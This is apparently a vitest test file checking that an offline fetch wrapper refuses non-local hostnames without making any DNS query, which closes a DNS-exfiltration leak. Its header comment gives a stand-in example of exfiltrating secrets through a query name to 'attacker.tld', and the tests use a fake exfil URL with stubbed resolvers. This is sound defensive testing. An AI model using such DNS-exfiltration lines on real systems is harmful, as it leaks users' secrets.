/**
 * [O-02] Offline, a DNS name that is not local by definition never reaches a resolver.
 *
 * The leak this pins shut: offline `trentFetch` used to resolve ANY hostname through the system
 * resolver and only then refuse it for being non-loopback. The query itself leaves the machine, so
 * `fetch("http://<secret-encoded>.attacker.tld/")` exfiltrated through the query name even though the
 * connection was refused. The rule now: offline, the only names that are ever turned into addresses
 * are `localhost` and `*.localhost` (RFC 6761: always this machine), and those are mapped to loopback
 * without asking anyone. An IP literal is checked as written. An operator `allowedHosts` entry passes
 * through as before. Every other name is refused with no resolver query at all.
 *
 * Every resolver here is injected and counts its calls; a leak is recorded, never performed.
 */
import http from "node:http";
import net from "node:net";
import { afterEach, describe, expect, it, vi } from "vitest";
import { EgressBlocked, assertLocalTarget } from "./offline.js";
import { createTrentFetch } from "./dial.js";
import type { LookupFn } from "../tools/web/url-safety.js";

const OFFLINE = process.env.TRENT_OFFLINE;
const EXFIL_URL = "http://exfil-198-51-100-7.example.com/";

afterEach(() => {
  if (OFFLINE === undefined) delete process.env.TRENT_OFFLINE;
  else process.env.TRENT_OFFLINE = OFFLINE;
  vi.unstubAllGlobals();
});

/** A resolver that records every name it is asked about and answers `addresses` (loopback by default). */
function counting(addresses: string[] = ["127.0.0.1"]): { lookup: LookupFn; calls: string[] } {
  const calls: string[] = [];
  const lookup: LookupFn = async (host) => {
    calls.push(host);
    return addresses.map((address) => ({ address, family: net.isIPv6(address) ? 6 : 4 }));
  };
  return { lookup, calls };
}

/** A platform `fetch` stub that records the URL it was asked to dial. */
function stubGlobalFetch(): string[] {
  const urls: string[] = [];
  vi.stubGlobal("fetch", async (input: RequestInfo | URL, init?: RequestInit) => {
    urls.push(new Request(input, init).url);
    return new Response("ok", { status: 200 });
  });
  return urls;
}

async function withLocalServer(run: (port: number) => Promise<void>): Promise<void> {
  const server = http.createServer((req, res) => res.end(`served:${req.url}`));
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  try {
    await run((server.address() as net.AddressInfo).port);
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
}

describe("[O-02] offline: a non-local name is refused without a DNS query", () => {
  it("offline trentFetch to a non-local name is refused and the resolver is asked ZERO times", async () => {
    process.env.TRENT_OFFLINE = "1";
    // The resolver would even answer loopback: the name must still never be asked about.
    const dns = counting(["127.0.0.1"]);
    const urls = stubGlobalFetch();
    await expect(createTrentFetch({ lookup: dns.lookup })(EXFIL_URL, { method: "GET" })).rejects.toBeInstanceOf(EgressBlocked);
    expect(dns.calls).toEqual([]);
    expect(urls).toEqual([]);
  });

  it("assertLocalTarget refuses a non-local name, naming it, without consulting the resolver", async () => {
    const dns = counting(["127.0.0.1"]);
    await expect(assertLocalTarget(EXFIL_URL, { lookup: dns.lookup })).rejects.toThrow(/exfil-198-51-100-7\.example\.com/);
    await expect(assertLocalTarget("https://api.openai.com/v1", { lookup: dns.lookup })).rejects.toBeInstanceOf(EgressBlocked);
    await expect(assertLocalTarget("http://ollama-box:11434/", { lookup: dns.lookup })).rejects.toBeInstanceOf(EgressBlocked);
    expect(dns.calls).toEqual([]);
  });

  it("a *.localhost name is mapped to 127.0.0.1 with no resolver query, whatever a resolver would say", async () => {
    const dns = counting(["203.0.113.9"]);
    const pin = await assertLocalTarget("http://secret-bits.localhost:8080/", { lookup: dns.lookup });
    expect(pin).toMatchObject({ host: "secret-bits.localhost", address: "127.0.0.1", family: 4 });
    expect(dns.calls).toEqual([]);
  });

  it("an operator allowedHosts entry still passes through as written, with no resolver query", async () => {
    process.env.TRENT_OFFLINE = "1";
    const dns = counting(["192.168.1.50"]);
    const urls = stubGlobalFetch();
    await createTrentFetch({ lookup: dns.lookup, allowedHosts: ["lan-ollama:11434"] })("http://lan-ollama:11434/api", { method: "GET" });
    expect(urls).toEqual(["http://lan-ollama:11434/api"]);
    expect(dns.calls).toEqual([]);
  });

  it("offline http://127.0.0.1:<port> and http://localhost:<port> still reach a real local server", async () => {
    process.env.TRENT_OFFLINE = "1";
    const dns = counting(["203.0.113.9"]);
    const dial = createTrentFetch({ lookup: dns.lookup });
    await withLocalServer(async (port) => {
      expect(await (await dial(`http://127.0.0.1:${port}/literal`)).text()).toBe("served:/literal");
      expect(await (await dial(`http://localhost:${port}/name`)).text()).toBe("served:/name");
      expect(await (await dial(`http://model.localhost:${port}/sub`)).text()).toBe("served:/sub");
    });
    expect(dns.calls).toEqual([]);
  });

  it("online, a name is still handed to the platform fetch to resolve, unchanged", async () => {
    delete process.env.TRENT_OFFLINE;
    const dns = counting();
    const urls = stubGlobalFetch();
    const res = await createTrentFetch({ lookup: dns.lookup })(EXFIL_URL, { method: "GET" });
    expect(res.status).toBe(200);
    expect(urls).toEqual([EXFIL_URL]);
    expect(dns.calls).toEqual([]); // online the guard never runs; the platform resolves the name as before
  });
});
